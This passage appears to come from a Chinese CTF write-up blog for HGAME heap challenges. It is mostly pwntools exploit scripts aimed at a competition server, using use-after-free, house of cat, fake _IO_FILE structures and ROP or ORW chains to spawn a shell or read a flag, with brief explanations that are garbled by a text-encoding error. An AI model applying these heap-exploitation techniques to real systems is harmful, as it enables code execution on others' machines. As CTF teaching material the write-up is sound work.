class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc.so.6&#x27;)   </span><br><span class="line"></span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">p=remote(&#x27;node1.hgame.vidar.club&#x27;,32272)</span><br><span class="line">#p = process(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">def add(i,size,content):</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(1))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(b&#x27;a&#x27;*7)</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(size))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">s(content)</span><br><span class="line">def free(i):</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(2))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">def edit(i,name,size,content):</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(3))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(name)</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(size))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">s(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show(i):</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(4))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0,0x68,b&#x27;a&#x27;)</span><br><span class="line">add(1,0x68,b&#x27;a&#x27;)</span><br><span class="line">add(2,0x68,b&#x27;a&#x27;)</span><br><span class="line">free(0)</span><br><span class="line">free(1)</span><br><span class="line">add(3,0x20,b&#x27;a&#x27;*(0x10))</span><br><span class="line">show(1)</span><br><span class="line">rl(&quot;Information: aaaaaaaaaaaaaaaa&quot;)</span><br><span class="line">heap_base=u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))-0x2d0</span><br><span class="line">li(hex(heap_base))</span><br><span class="line">free(1)</span><br><span class="line">add(0,0x20,b&#x27;a&#x27;)</span><br><span class="line">add(1,0x68,b&#x27;a&#x27;)</span><br><span class="line">add(2,0x68,b&#x27;a&#x27;)</span><br><span class="line"></span><br><span class="line">for i in range(20):</span><br><span class="line">add(i+3,0x90,b&#x27;a&#x27;)</span><br><span class="line">for i in range(7):</span><br><span class="line">free(i+3)</span><br><span class="line">add(21,0x20,b&#x27;a&#x27;)</span><br><span class="line">free(11)</span><br><span class="line">free(13)</span><br><span class="line">add(22,0x38,b&#x27;a&#x27;)#16</span><br><span class="line">show(16)</span><br><span class="line">libc_base=get_addr64()-2207073</span><br><span class="line">li(hex(libc_base))</span><br><span class="line"></span><br><span class="line">system,bin_sh=get_sb()</span><br><span class="line">IO_list_all=libc_base+libc.sym[&#x27;_IO_list_all&#x27;]-0x10</span><br><span class="line">setcontext=libc_base+libc.sym[&#x27;setcontext&#x27;]</span><br><span class="line">rdi = libc_base+libc.search(asm(&quot;pop rdi\nret&quot;)).__next__()</span><br><span class="line">rsi = libc_base+libc.search(asm(&quot;pop rsi\nret&quot;)).__next__()</span><br><span class="line">rdx = libc_base+libc.search(asm(&quot;pop rdx\nret&quot;)).__next__()</span><br><span class="line">rdx_r12= libc_base+libc.search(asm(&quot;pop rdx\npop r12\nret&quot;)).__next__()</span><br><span class="line">rax = libc_base+libc.search(asm(&quot;pop rax\nret&quot;)).__next__()</span><br><span class="line">ret = libc_base+libc.search(asm(&quot;ret&quot;)).__next__()</span><br><span class="line">syscall=libc_base+libc.search(asm(&quot;syscall\nret&quot;)).__next__()</span><br><span class="line">open=libc_base+libc.sym[&#x27;open&#x27;]</span><br><span class="line">read=libc_base + libc.sym[&#x27;read&#x27;]</span><br><span class="line">write=libc_base + libc.sym[&#x27;write&#x27;]</span><br><span class="line">add(23,0x40,b&#x27;a&#x27;)#17</span><br><span class="line">add(24,0x100,b&#x27;\x00&#x27;*0x30+p64(0x81)+b&#x27;a&#x27;*8)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#add(25,-10,hex(heap_base+0x950))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(1))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(25))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(b&#x27;a&#x27;*7)</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(-10))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(hex(heap_base+0x1590))</span><br><span class="line">IO_list_all_xor=(heap_base+0x1590&gt;&gt;12)^IO_list_all</span><br><span class="line">edit(18,b&#x27;a&#x27;,0x100,b&#x27;\x00&#x27;*(0x30)+p64(0x81)+p64(IO_list_all_xor))</span><br><span class="line"></span><br><span class="line">_IO_wfile_jumps = libc_base + libc.sym[&#x27;_IO_wfile_jumps&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">chunk3=heap_base+0x1660-0x8 # ä¼ªé€ çš„fake_IOç»“æ„ä½“çš„åœ°å€</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shell=p64(rdi+1)+p64(rdi)+p64(bin_sh)+p64(system)</span><br><span class="line"></span><br><span class="line">fake_ret=chunk3+0xe0+0xe0+0x18</span><br><span class="line"></span><br><span class="line">IO_FILE1 = p64(0)*3+p64(1)+b&#x27;\x00&#x27;*0x38+p64(0)                         #_chain</span><br><span class="line">IO_FILE1+= p32(0)+b&#x27;\x08&#x27;                                              #_flags2</span><br><span class="line">IO_FILE1 = IO_FILE1.ljust(0x80,b&#x27;\x00&#x27;)+p64(chunk3)                    #lock</span><br><span class="line">IO_FILE1 = IO_FILE1.ljust(0x90,b&#x27;\x00&#x27;)+p64(chunk3+0xe0)               #_wide_data  ***  rdx</span><br><span class="line">IO_FILE1 = IO_FILE1.ljust(0xb0,b&#x27;\x00&#x27;)</span><br><span class="line">IO_FILE1 = IO_FILE1.ljust(0xc8,b&#x27;\x00&#x27;)+p64(_IO_wfile_jumps)           #vtable</span><br><span class="line"></span><br><span class="line">IO_FILE1+= b&#x27;\x00&#x27;.ljust(0xa0,b&#x27;\x00&#x27;)+p64(fake_ret)+p64(rdi+1)</span><br><span class="line">IO_FILE1+= b&#x27;/flag\x00\x00\x00&#x27;.ljust(0x30,b&#x27;\x00&#x27;)+p64(chunk3+0xe0+0xe8-0x68)+p64(setcontext+61)</span><br><span class="line">IO_FILE1+= p64(rdi+1)*2+shell</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(25,0x68,b&#x27;a&#x27;)</span><br><span class="line"></span><br><span class="line">add(26,0x3f0,IO_FILE1)</span><br><span class="line">add(27,0x68,b&#x27;\x00&#x27;*8+p64(chunk3))</span><br><span class="line"></span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(5))</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h4 id="Where-is-the-vulnerability">Where is the vulnerability</h4><p>èœå•å †é¢˜ï¼Œ2.39</p><p>add,edit,free,showå››ä¸ªåŠŸèƒ½æ­£å¸¸</p><p>å­˜åœ¨uafæ¼æ´ï¼Œè¿™é‡Œç›´æ¥èµ°house of catå°±è¡Œ</p><p>å­˜åœ¨æ²™ç›’ï¼Œèµ°orw</p><p>ä¸‰ä¸ªåº“patchä¸€ä¸‹å°±è¡Œï¼Œä¸è¦å¿˜äº†æ›´æ”¹æƒé™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">patchelf --replace-needed libc.so.6 è·¯å¾„  æ–‡ä»¶</span><br><span class="line">patchelf --replace-needed libhgame.so è·¯å¾„  æ–‡ä»¶</span><br><span class="line">patchelf --set-interpreter ./ld-2.23.so è·¯å¾„ æ–‡ä»¶</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc.so.6&#x27;)   </span><br><span class="line"></span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">p=remote(&#x27;node1.hgame.vidar.club&#x27;,31346)</span><br><span class="line">#p = process(&#x27;./pwn&#x27;)</span><br><span class="line">def add(i,size):</span><br><span class="line">rl(&quot;5. Exit&quot;)</span><br><span class="line">sl(str(1))</span><br><span class="line">rl(&quot;Index: &quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">rl(&quot;Size: &quot;)</span><br><span class="line">sl(str(size))</span><br><span class="line"></span><br><span class="line">def free(i):</span><br><span class="line">rl(&quot;5. Exit&quot;)</span><br><span class="line">sl(str(2))</span><br><span class="line">rl(&quot;Index: &quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line"></span><br><span class="line">def edit(i,content):</span><br><span class="line">rl(&quot;5. Exit&quot;)</span><br><span class="line">sl(str(3))</span><br><span class="line">rl(&quot;Index: &quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">rl(&quot;Content: &quot;)</span><br><span class="line">s(content)</span><br><span class="line"></span><br><span class="line">def show(i):</span><br><span class="line">rl(&quot;5. Exit&quot;)</span><br><span class="line">sl(str(4))</span><br><span class="line">rl(&quot;Index: &quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">add(0,0x520) #0</span><br><span class="line">add(1,0x558) #1</span><br><span class="line">add(2,0x510) #2</span><br><span class="line">add(3,0x550) #3</span><br><span class="line"></span><br><span class="line">free(0)</span><br><span class="line">show(0)</span><br><span class="line">libc_base=get_addr64()-2112288</span><br><span class="line">li(hex(libc_base))</span><br><span class="line">system,bin_sh=get_sb()</span><br><span class="line">IO_list_all=libc_base+libc.sym[&#x27;_IO_list_all&#x27;]</span><br><span class="line">setcontext=libc_base+libc.sym[&#x27;setcontext&#x27;]</span><br><span class="line">rdi = libc_base+libc.search(asm(&quot;pop rdi\nret&quot;)).__next__()</span><br><span class="line">rsi = libc_base+libc.search(asm(&quot;pop rsi\nret&quot;)).__next__()</span><br><span class="line">rdx = libc_base+0x0000000000066b9a</span><br><span class="line">#rdx_r12= libc_base+libc.search(asm(&quot;pop rdx\npop r12\nret&quot;)).__next__()</span><br><span class="line">rax = libc_base+libc.search(asm(&quot;pop rax\nret&quot;)).__next__()</span><br><span class="line">ret = libc_base+libc.search(asm(&quot;ret&quot;)).__next__()</span><br><span class="line">syscall=libc_base+libc.search(asm(&quot;syscall\nret&quot;)).__next__()</span><br><span class="line">open=libc_base+libc.sym[&#x27;open&#x27;]</span><br><span class="line">read=libc_base + libc.sym[&#x27;read&#x27;]</span><br><span class="line">write=libc_base + libc.sym[&#x27;write&#x27;]</span><br><span class="line"></span><br><span class="line">add(4,0x600)</span><br><span class="line">edit(0,b&#x27;a&#x27;*(0x10))</span><br><span class="line">show(0)</span><br><span class="line">rl(b&#x27;a&#x27;*(0x10))</span><br><span class="line">heap_base=u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))-0x290</span><br><span class="line">li(hex(heap_base))</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">edit(0,p64(libc_base+2113360)*2+p64(heap_base+0x290)+p64(IO_list_all-0x20))</span><br><span class="line">add(5,0x600)</span><br><span class="line"></span><br><span class="line">_IO_wfile_jumps = libc_base + libc.sym[&#x27;_IO_wfile_jumps&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">chunk3=heap_base+0xd20 # ä¼ªé€ çš„fake_IOç»“æ„ä½“çš„åœ°å€</span><br><span class="line"></span><br><span class="line">_IO_wfile_jumps = libc_base + libc.sym[&#x27;_IO_wfile_jumps&#x27;]</span><br><span class="line"></span><br><span class="line">fake_IO_FILE  =p64(0)*2+p64(1)+p64(chunk3+0x8)  </span><br><span class="line">fake_IO_FILE  =fake_IO_FILE.ljust(0x60,b&#x27;\x00&#x27;)  </span><br><span class="line">fake_IO_FILE +=p64(0)+p64(chunk3+0xf8)+p64(system) #rdi,rsi</span><br><span class="line">fake_IO_FILE +=p64(heap_base)              </span><br><span class="line">fake_IO_FILE +=p64(0x100)                       #rdx</span><br><span class="line">fake_IO_FILE  =fake_IO_FILE.ljust(0x90, b&#x27;\x00&#x27;)</span><br><span class="line">fake_IO_FILE +=p64(chunk3+0x8)                  #_wide_data,rax1_addr</span><br><span class="line">fake_IO_FILE +=p64(chunk3+0xf0)+p64(rdi+1)      #rsp</span><br><span class="line">fake_IO_FILE +=p64(0)+p64(1)+p64(0)*2</span><br><span class="line">fake_IO_FILE +=p64(_IO_wfile_jumps+0x30)        # vtable=IO_wfile_jumps+0x10</span><br><span class="line">fake_IO_FILE +=p64(setcontext+61)+p64(chunk3+0xc8)</span><br><span class="line">fake_IO_FILE +=p64(read)</span><br><span class="line"></span><br><span class="line">edit(2,fake_IO_FILE)</span><br><span class="line"></span><br><span class="line">#bug()</span><br><span class="line">rl(&quot;5. Exit&quot;)</span><br><span class="line">sl(str(5))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(0.1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">orw  = p64(rdi) + p64(heap_base+0xea0)  </span><br><span class="line">orw += p64(rsi) + p64(0)</span><br><span class="line">orw += p64(rax)+p64(2)+p64(syscall)</span><br><span class="line"></span><br><span class="line">orw += p64(rdi) + p64(3)</span><br><span class="line">orw += p64(rsi)+p64(heap_base+0x100)</span><br><span class="line">orw += p64(read)</span><br><span class="line">orw += p64(rdi) + p64(1)</span><br><span class="line">orw += p64(rsi)+p64(heap_base+0x100)</span><br><span class="line">orw += p64(write)+b&#x27;./flag\x00\x00&#x27;</span><br><span class="line">sl(orw)</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h4 id="signin2Heap">signin2Heap</h4><p>èœå•å †é¢˜ï¼Œ2.27</p><p>addï¼Œfree,showä¸‰ä¸ªåŠŸèƒ½å‡½æ•°</p><p>addä¸­å­˜åœ¨of by nullæ¼æ´ï¼Œé™åˆ¶å¤§å°&lt;0xff</p><p>å› ä¸ºaddä¼šå°†æœ€åä¸€ä¸ªå­—ç¬¦è½¬ä¸º\x00ä¼šå°†æ‰“å°å‡½æ•°æˆªæ–­</p><p>è¿™é‡Œæˆ‘ä»¬å…ˆæŠŠtcacheå¡æ»¡ï¼Œä¹‹åèƒ½å¾—åˆ°è¿›å…¥unsortdbinå †å—ï¼Œæ§åˆ¶å¥½å †å¸ƒå±€ï¼Œå°†ä¸‹ä¸€ä¸ªå †å—çš„pr_sizeå’Œpr_inuseä½ä¿®æ”¹ï¼Œé‡Šæ”¾è§¦å‘å †å—åˆå¹¶ï¼Œä¹‹åå°†ç¬¬ä¸€ä¸ªå †å—ç”³è¯·å‡ºæ¥ï¼Œlibcåœ°å€å°±ä¼šè¿›å…¥ç¬¬äºŒä¸ªå †å—ä¸­ï¼Œè¿™ä¸ªå †å—è¿˜æ²¡æœ‰é‡Šæ”¾ï¼Œæ³„éœ²å¾—åˆ°libc</p><p>ä¹‹åå†æ¬¡é€ æˆå †å—åˆå¹¶ï¼ŒåŒæ—¶ç”³è¯·å‡ºç¬¬ä¸€ä¸ªå †å—åŒ…å«ç¬¬äºŒä¸ªï¼ˆæœªé‡Šæ”¾ï¼‰fdä½ï¼Œé‡Šæ”¾ç¬¬äºŒä¸ªå †å—ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ›´æ”¹å®ƒçš„fdä½ï¼Œå®Œæˆtcachebin attackï¼Œæ”»å‡»free_hookï¼Œgetshell</p><p>åŸç†çš„è¯å¯ä»¥çœ‹è¿™ç¯‡æ–‡ç« <a href="https://www.jianshu.com/p/056c9db22d81">https://www.jianshu.com/p/056c9db22d81</a></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739887952446-796c20d1-bffb-4c3d-a316-89b6477a7889.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def 